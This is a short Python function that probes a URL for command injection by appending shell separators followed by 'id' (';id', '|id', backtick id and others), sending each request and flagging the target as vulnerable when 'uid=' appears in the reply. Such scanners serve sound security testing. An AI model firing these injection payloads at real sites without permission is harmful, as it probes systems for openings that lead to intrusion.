import requests

def scan_cmdinj(url):
    payloads = [";id", "|id", "&id", "||id", "`id`"]
    results = []

    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if "uid=" in r.text:
                results.append({
                    "payload": payload,
                    "result": "VULNERABLE",
                    "url_tested": test_url
                })
            else:
                results.append({
                    "payload": payload,
                    "result": "Not Vulnerable",
                    "url_tested": test_url
                })
        except Exception as e:
            results.append({
                "payload": payload,
                "result": f"ERROR: {str(e)}",
                "url_tested": test_url
            })

    vulnerable = any(r["result"] == "VULNERABLE" for r in results)
    return {
        "url": url,
        "vulnerable": vulnerable,
        "payloads_tested": results
    }
